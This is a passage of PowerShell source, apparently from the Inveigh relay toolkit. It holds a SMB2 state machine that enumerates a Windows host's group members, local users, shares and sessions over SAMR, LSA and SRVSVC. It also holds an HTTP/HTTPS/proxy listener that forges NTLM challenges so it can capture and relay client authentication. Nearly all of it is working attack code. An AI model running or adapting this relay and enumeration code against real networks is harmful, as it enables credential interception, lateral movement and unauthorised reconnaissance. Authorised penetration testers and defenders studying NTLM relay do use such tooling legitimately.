                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRQueryGroupMember $group_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x19,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'QueryInfoRequest'
                    {          
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2QueryInfoRequest 0x01 0x05 0x18,0x00,0x00,0x00 0x68,0x00 $file_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }
                
                    'ReadRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2ReadRequest $file_ID
                        $packet_SMB_data["Length"] = 0x00,0x04,0x00,0x00
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data 
                        $stage = 'SendReceive'
                    }

                    'RPCBind'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_RPC_data = New-PacketRPCBind $frag_length $call_ID $num_ctx_items 0x00,0x00 $named_pipe_UUID $named_pipe_UUID_version
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $stage = 'SendReceive' 
                    }

                    'SAMRCloseRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRClose $SAMR_domain_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x01,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'SendReceive'
                    {
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }
            
                    'StatusPending'
                    {
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $stage = $stage_next
                        }

                    }

                    'StatusReceived'
                    {
                        
                        switch ($stage_current)
                        {

                            'CloseRequest'
                            {

                                if($step -eq 1)
                                {
                                    $named_pipe = 0x73,0x00,0x61,0x00,0x6d,0x00,0x72,0x00 # samr
                                    $stage = 'CreateRequest'
                                }
                                elseif($action_stage -eq 'Share' -and $share_list.Count -gt 0)
                                {
                                    $stage = 'TreeConnect'
                                }
                                else
                                {
                                    $stage = 'TreeDisconnect'
                                }

                            }

                            'Connect2'
                            {
                                $step++

                                if($client_receive[119] -eq 3 -and [System.BitConverter]::ToString($client_receive[140..143]) -eq '05-00-00-00')
                                {
                                    $RPC_access_denied = $true
                                    $stage = 'CloseRequest'
                                }
                                else
                                {
                                    $SID_count = 0x04,0x00,0x00,0x00
                                    [Byte[]]$SAMR_connect_handle = $client_receive[140..159]
                                    $stage = 'OpenDomain'
                                }

                            }

                            'Connect5'
                            {
                                $step++

                                if($client_receive[119] -eq 3 -and [System.BitConverter]::ToString($client_receive[140..143]) -eq '05-00-00-00')
                                {
                                    $stage = 'CloseRequest'
                                }
                                else
                                {
                                    $SID_count = 0x04,0x00,0x00,0x00
                                    [Byte[]]$SAMR_connect_handle = $client_receive[156..175]
                                    $stage = 'OpenDomain'
                                }

                            }

                            'CreateRequest'
                            {

                                if($action_stage -eq 'Share')
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 2
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    $named_pipe_UUID_version = 0x03,0x00
                                    $stage_next = 'NetShareEnumAll'
                                }
                                elseif($action_stage -eq 'NetSession')
                                {
                                    $frag_length = 0x74,0x00
                                    $call_ID = 2
                                    $num_ctx_items = 0x02
                                    $named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    $named_pipe_UUID_version = 0x03,0x00
                                    $stage_next = 'NetSessEnum'
                                }
                                elseif($step -eq 1)
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 5
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac
                                    $named_pipe_UUID_version = 0x01,0x00

                                    if($action_stage -eq 'User')
                                    {
                                        $stage_next = 'Connect5'
                                    }
                                    else
                                    {
                                        $stage_next = 'Connect2'
                                    }

                                }
                                elseif($step -gt 2)
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 14
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    $named_pipe_UUID_version = 0x00,0x00
                                    $named_pipe = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    $stage_next = 'LSAOpenPolicy'
                                }
                                else
                                {
                                    $frag_length = 0x48,0x00
                                    $call_ID = 1
                                    $num_ctx_items = 0x01
                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    $named_pipe_UUID_version = 0x00,0x00
                                    $named_pipe = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    $stage_next = 'LSAOpenPolicy'
                                }

                                $file_ID = $client_receive[132..147]
                        
                                if($Refresh -and $stage -ne 'Exit')
                                {
                                    Write-Output "[+] Session refreshed" # check
                                    $stage = 'Exit'
                                }
                                elseif($step -ge 2)
                                {
                                    $stage = 'RPCBind'
                                }
                                elseif($stage -ne 'Exit')
                                {
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                            'EnumDomainUsers'
                            {
                                $step++
                                $stage = 'ParseUsers'
                            }

                            'GetMembersInAlias'
                            {
                                $step++
                                [Byte[]]$SID_array = $client_receive[140..([System.BitConverter]::ToInt16($client_receive[3..1],0) - 1)]
                        
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    $named_pipe = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc
                                    $stage = 'CreateRequest'
                                }

                            }

                            'Logoff'
                            {
                                $stage = 'Exit'
                            }

                            'LookupNames'
                            {
                                $step++
                                [Byte[]]$SAMR_RID = $client_receive[152..155]
                                
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    
                                    if($step -eq 4)
                                    {
                                        $stage = 'OpenGroup'
                                    }
                                    else
                                    {
                                        $stage = 'OpenAlias'
                                    }

                                }

                            }

                            'LookupRids'
                            {
                                $step++
                                $stage = 'ParseLookupRids'
                            }

                            'LSAClose'
                            {
                                $stage = 'CloseRequest'
                            }

                            'LSALookupSids'
                            {
                                $stage = 'ParseLookupSids'
                            }

                            'LSAOpenPolicy'
                            {
                                [Byte[]]$policy_handle = $client_receive[140..159]

                                if($step -gt 2)
                                {
                                    $stage = 'LSALookupSids'
                                }
                                else
                                {
                                    $stage = 'LSAQueryInfoPolicy'    
                                }

                            }

                            'LSAQueryInfoPolicy'
                            {
                                [Byte[]]$LSA_domain_length_bytes = $client_receive[148..149]
                                $LSA_domain_length = [System.BitConverter]::ToInt16($LSA_domain_length_bytes,0)
                                [Byte[]]$LSA_domain_actual_count_bytes = $client_receive[168..171]
                                $LSA_domain_actual_count = [System.BitConverter]::ToInt32($LSA_domain_actual_count_bytes,0)
                                
                                if($LSA_domain_actual_count % 2)
                                {
                                    $LSA_domain_length += 2
                                }

                                [Byte[]]$LSA_domain_SID = $client_receive[(176 + $LSA_domain_length)..(199 + $LSA_domain_length)]
                                $stage = 'LSAClose'
                            }

                            'NetSessEnum'
                            {

                                if([System.BitConverter]::ToString($client_receive[172..175]) -eq '05-00-00-00' -or [System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                                {
                                    $stage = 'CloseRequest'
                                }
                                else
                                {
                                    $stage = 'ParseSRVSVC'
                                }

                            }

                            'NetShareEnumAll'
                            {
                                $stage = 'ParseSRVSVC'
                            }

                            'OpenAlias'
                            {
                                $step++
                                [Byte[]]$SAMR_policy_handle = $client_receive[140..159]
                        
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    $stage = 'GetMembersInAlias'
                                }

                            }

                            'OpenDomain'
                            {
                                $step++
                                [Byte[]]$SAMR_domain_handle = $client_receive[140..159]

                                if($action_stage -eq 'User')
                                {
                                    $stage = 'EnumDomainUsers'
                                }
                                else
                                {
                                    $stage = 'LookupNames'
                                }

                            }

                            'OpenGroup'
                            {
                                $step++
                                [Byte[]]$group_handle = $client_receive[140..159]
                                $stage = 'QueryGroupMember'
                            }

                            'QueryGroupMember'
                            {
                                $step++
                                [Byte[]]$RID_count_bytes = $client_receive[144..147]
                                $RID_count = [System.BitConverter]::ToInt16($RID_count_bytes,0)
                                [Byte[]]$RID_list = $client_receive[160..(159 + ($RID_count * 4))]
                                $stage = 'LookupRids'
                            }

                            'QueryInfoRequest'
                            {
                                $file_ID = $client_receive[132..147]
                                $stage = 'RPCBind'
                            }

                            'ReadRequest'
                            {
                                $stage = $stage_next
                            }

                            'RPCBind'
                            {
                                $stage = 'ReadRequest'
                            }

                            'SAMRCloseRequest'
                            {
                                $step++

                                if($step -eq 8)
                                {
                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $Group group not found") > $null
                                    $stage = 'TreeDisconnect'
                                }
                                else
                                {

                                    if($step -eq 5 -and $action_stage -eq 'Group')
                                    {
                                        $LSA_domain_SID = 0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00
                                        $SID_count = 0x01,0x00,0x00,0x00
                                    }

                                    $stage = 'OpenDomain'
                                }

                            }

                            'TreeConnect'
                            {
                                $tree_ID = $client_receive[40..43]
                                $access_mask = $null

                                if($client_receive[76] -eq 92)
                                {
                                    $tree_access_mask = 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    $tree_access_mask = $client_receive[80..83]
                                }

                                if($share_list.Count -gt 0)
                                {

                                    if($client_receive[76] -ne 92)
                                    {

                                        foreach($byte in $tree_access_mask)
                                        {
                                            $access_mask = [System.Convert]::ToString($byte,2).PadLeft(8,'0') + $access_mask
                                        }
                                        
                                        $response_object_list | Where-Object {$_.Share -eq $share_list[$j]} | ForEach-Object {$_."Access Mask" = $access_mask}
                                        $stage = 'TreeDisconnect'
                                    }
                                    else
                                    {
                                        $access_mask = "00000000000000000000000000000000"
                                        $response_object_list | Where-Object {$_.Share -eq $share_list[$j]} | ForEach-Object {$_."Access Mask" = $access_mask}
                                        $stage = 'TreeConnect'
                                        $j++
                                    }

                                }
                                else
                                {
                                    
                                    if($action_stage -eq 'Share' -or $action_stage -eq 'NetSession')
                                    {
                                        $named_pipe = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 # srvsvc
                                    }
                                    else
                                    {
                                        $named_pipe = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc
                                    }

                                    $tree_IPC = $tree_ID
                                    $stage = 'CreateRequest'
                                }

                            }

                            'TreeDisconnect'
                            {

                                if($Action -eq 'All')
                                {

                                    switch ($action_stage) 
                                    {

                                        'group'
                                        {

                                            if($RPC_access_denied)
                                            {
                                                $action_stage = "share"
                                            }
                                            else
                                            {
                                                $action_stage = "user"
                                                $step = 0
                                            }

                                            $stage = "treeconnect"
                                        }

                                        'user'
                                        {
                                            $action_stage = "netsession"
                                            $stage = "treeconnect"
                                        }

                                        'netsession'
                                        {
                                            $action_stage = "share"
                                            $stage = "treeconnect"
                                        }

                                        'share'
                                        {

                                            if($share_list.Count -gt 0 -and $j -lt $share_list.Count - 1)
                                            {
                                                $stage = 'TreeConnect'
                                                $j++
                                            }
                                            elseif($share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)
                                            {
                                                $tree_ID = $tree_IPC
                                                $stage = 'TreeDisconnect'
                                                $j++
                                            }
                                            else
                                            {
                                                
                                                if($attack -contains 'session')
                                                {
                                                    $stage = 'Exit'
                                                }
                                                else
                                                {
                                                    $stage = 'Logoff'
                                                }

                                            }
                                            
                                        }

                                    }

                                }
                                else
                                {
                                    
                                    if($action_stage -eq 'Share' -and $share_list.Count -gt 0 -and $j -lt $share_list.Count - 1)
                                    {
                                        $stage = 'TreeConnect'
                                        $j++
                                    }
                                    elseif($action_stage -eq 'Share' -and $share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)
                                    {
                                        $tree_ID = $tree_IPC
                                        $stage = 'TreeDisconnect'
                                        $j++
                                    }
                                    else
                                    {
                                    
                                        if($inveigh_session -and !$Logoff)
                                        {
                                            $stage = 'Exit'
                                        }
                                        else
                                        {
                                            $stage = 'Logoff'
                                        }

                                    }

                                }
                                
                            }

                        }

                    }

                    'TreeConnect'
                    {
                        $message_ID++
                        $stage_current = $stage

                        if($share_list.Count -gt 0)
                        {
                            $path = "\\" + $Target + "\" + $share_list[$j]
                            $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
                        }

                        $packet_SMB_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2TreeConnectRequest $path_bytes
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }

                    'TreeDisconnect'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }

                }
        
            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current") > $null
                $stage = 'Exit'
            }

        }

        For($i = 0;$i -lt $enumerate_group_user_list.Count;$i++)
        {
            $user_entry = $enumerate_group_user_list[$i]
            $user_entry_split = $user_entry.Split("\")
            $domain = $user_entry_split[0]
            $username = $user_entry_split[1]

            if($inveigh.domain_mapping_table.ContainsKey($domain))
            {
                $user_update = ($username + "@" + $inveigh.domain_mapping_table.$domain).ToUpper()
                $enumerate_group_user_list[$i] = $user_update
            }

        }

        For($i = 0;$i -lt $enumerate_group_group_list.Count;$i++)
        {
            $group_entry = $enumerate_group_group_list[$i]
            $group_entry_split = $group_entry.Split("\")
            $domain = $group_entry_split[0]
            $group = $group_entry_split[1]

            if($inveigh.domain_mapping_table.ContainsKey($domain))
            {
                $group_update = ($group + "@" + $inveigh.domain_mapping_table.$domain).ToUpper()
                $enumerate_group_group_list[$i] = $group_update
            }

        }

        $inveigh.session_message_ID_table[$inveigh.session_count] = $message_ID

        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
        {

            if($inveigh.enumerate[$i].IP -eq $target)
            {
                $target_index = $i
                break
            }

        }

        if($EnumerateGroup -eq 'Administrators')
        {
            $inveigh.enumerate[$target_index]."Administrator Users" = $enumerate_group_user_list
            $inveigh.enumerate[$target_index]."Administrator Groups" = $enumerate_group_group_list
        }

        $inveigh.enumerate[$target_index]."Local Users" = $enumerate_user_list
        $inveigh.enumerate[$target_index].Shares = $enumerate_share_list
        $net_sessions_unique = @()

        foreach($net_session_entry in $enumerate_netsession_list)
        {

            if($inveigh.enumerate[$target_index].NetSessions -notcontains $net_session_entry)
            {
                $net_sessions_unique += $net_session_entry
            }

            $net_session_IP = ($net_session_entry.Split("\"))[2]
            $net_session_user = ($net_session_entry.Split("\"))[3]

            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
            {

                if($inveigh.enumerate[$i].IP -contains $net_session_IP)
                {
                    $net_session_index = $i
                    break
                }

            }

            if($net_session_index -and $inveigh.enumerate[$net_session_index].NetSessions -notcontains $net_session_user)
            {
                $inveigh.enumerate[$net_session_index]."NetSessions Mapped" += $net_session_user
            }
            else
            {
                $inveigh.enumerate.Add((New-RelayEnumObject -IP $net_session_IP -NetSessionsMapped $net_session_user)) > $null
            }

        }

        $inveigh.enumerate[$target_index].NetSessions += $net_sessions_unique
        
        if(!$RPC_access_denied)
        {
            $inveigh.enumerate[$target_index].Enumerate = $(Get-Date -format s)
        }

    }

}

# HTTP/HTTPS/Proxy Server ScriptBlock
$HTTP_scriptblock = 
{ 
    param ($Attack,$Challenge,$Command,$Enumerate,$EnumerateGroup,$FailedLoginThreshold,$HTTPIP,$HTTPPort,
    $HTTPS_listener,$Proxy,$ProxyIgnore,$proxy_listener,$RelayAutoDisable,$RepeatEnumerate,
    $RepeatExecute,$Service,$SMB_version,$SessionLimitPriv,$SessionLimitUnpriv,$SessionLimitShare,
    $SessionPriority,$Target,$TargetMode,$TargetRefresh,$Username,$WPADAuth,$WPADAuthIgnore,$WPADResponse)

    function Get-NTLMChallengeBase64
    {
        param ([String]$Challenge,[String]$ClientIPAddress,[Int]$ClientPort)

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($Challenge)
        {
            $HTTP_challenge = $Challenge
            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object{"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ',''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        if(!$inveigh.HTTP_session_table.ContainsKey("$ClientIPAddress`:$ClientPort"))
        {
            $inveigh.HTTP_session_table.Add("$ClientIPAddress`:$ClientPort",$HTTP_challenge)
        }
        else
        {
            $inveigh.HTTP_session_table["$ClientIPAddress`:$ClientPort"] = $HTTP_challenge
        }

        $hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.computer_name)
        $netBIOS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.netBIOS_domain)
        $DNS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_domain)
        $DNS_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_computer_name)
        $hostname_length = [System.BitConverter]::GetBytes($hostname_bytes.Length)[0,1]
        $netBIOS_domain_length = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length)[0,1]
        $DNS_domain_length = [System.BitConverter]::GetBytes($DNS_domain_bytes.Length)[0,1]
        $DNS_hostname_length = [System.BitConverter]::GetBytes($DNS_hostname_bytes.Length)[0,1]
        $target_length = [System.BitConverter]::GetBytes($hostname_bytes.Length + $netBIOS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_hostname_bytes.Length + 36)[0,1]
        $target_offset = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length + 56)

        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                            $netBIOS_domain_length +
                            $netBIOS_domain_length +
                            0x38,0x00,0x00,0x00 +
                            0x05,0x82,0x89,0xa2 +
                            $HTTP_challenge_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                            $target_length +
                            $target_length + 
                            $target_offset +
                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +
                            $netBIOS_domain_bytes +
                            0x02,0x00 + 
                            $netBIOS_domain_length +
                            $netBIOS_domain_bytes + 
                            0x01,0x00 +
                            $hostname_length +
                            $hostname_bytes +
                            0x04,0x00 +
                            $DNS_domain_length +
                            $DNS_domain_bytes +
                            0x03,0x00 +
                            $DNS_hostname_length +
                            $DNS_hostname_bytes +
                            0x05,0x00 +
                            $DNS_domain_length +
                            $DNS_domain_bytes +
                            0x07,0x00,0x08,0x00 +
                            $HTTP_timestamp +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = 'NTLM ' + $NTLM_challenge_base64

        return $NTLM
    }

    if($HTTPS_listener)
    {
        $HTTP_type = "HTTPS"
    }
    elseif($proxy_listener)
    {
        $HTTP_type = "Proxy"
    }
    else
    {
        $HTTP_type = "HTTP"
    }

    if($HTTPIP -ne '0.0.0.0')
    {
        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
        $HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
    }
    else
    {
        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
    }

    $HTTP_running = $true
    $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
    $process_ID_bytes = Get-ProcessIDArray
    $relay_step = 0

    if($proxy_listener)
    {
        $HTTP_linger = New-Object System.Net.Sockets.LingerOption($true,0)
        $HTTP_listener.Server.LingerState = $HTTP_linger
    }

    try
    {
        $HTTP_listener.Start()
    }
    catch
    {
        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        $HTTP_running = $false

        if($inveigh.file_output)
        {
            $inveigh.log_file_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        }

        if($inveigh.log_output)
        {
            $inveigh.log.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        }

    }

    :HTTP_listener_loop while($inveigh.relay_running -and $HTTP_running)
    {
        $TCP_request = $null
        $TCP_request_bytes = New-Object System.Byte[] 4096
        $HTTP_send = $true
        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: text/html")
        $HTTP_header_cache_control = $null
        $HTTP_header_authenticate = $null
        $HTTP_header_authenticate_data = $null
        $HTTP_message = ''
        $HTTP_header_authorization = ''
        $HTTP_header_host = $null
        $HTTP_header_user_agent = $null
        $HTTP_request_raw_URL = $null
        $NTLM = "NTLM"
        
        if(!$HTTP_client.Connected -and $inveigh.relay_running)
        {
            $HTTP_client_close = $false
            $HTTP_async = $HTTP_listener.BeginAcceptTcpClient($null,$null)

            do
            {

                if(!$inveigh.relay_running)
                {
                    break HTTP_listener_loop
                }

                Start-Sleep -m 10
            }
            until($HTTP_async.IsCompleted)

            $HTTP_client = $HTTP_listener.EndAcceptTcpClient($HTTP_async)
            $HTTP_client_handle_old = $HTTP_client.Client.Handle
            
            if($HTTPS_listener)
            {
                $HTTP_clear_stream = $HTTP_client.GetStream()
                $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)
                $SSL_cert = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $inveigh.certificate_CN})
                $HTTP_stream.AuthenticateAsServer($SSL_cert,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
            }
            else
            {
                $HTTP_stream = $HTTP_client.GetStream()
            }
            
        }
        
        if($relay_step -gt 0)
        {
            $relay_reset++

            if($relay_reset -gt 2)
            {
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay attack resetting") > $null
                $relay_step = 0
            }

        }
        else
        {
            $relay_reset = 0
        }

        if($HTTPS_listener)
        {
            [Byte[]]$SSL_request_bytes = $null

            while($HTTP_clear_stream.DataAvailable)
            {
                $HTTP_request_byte_count = $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
                $SSL_request_bytes += $TCP_request_bytes[0..($HTTP_request_byte_count - 1)]
            }

            $TCP_request = [System.BitConverter]::ToString($SSL_request_bytes)
        }
        else
        {
            
            while($HTTP_stream.DataAvailable)
            {
                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null
            }

            $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)
        }
        
        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*")
        {
            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
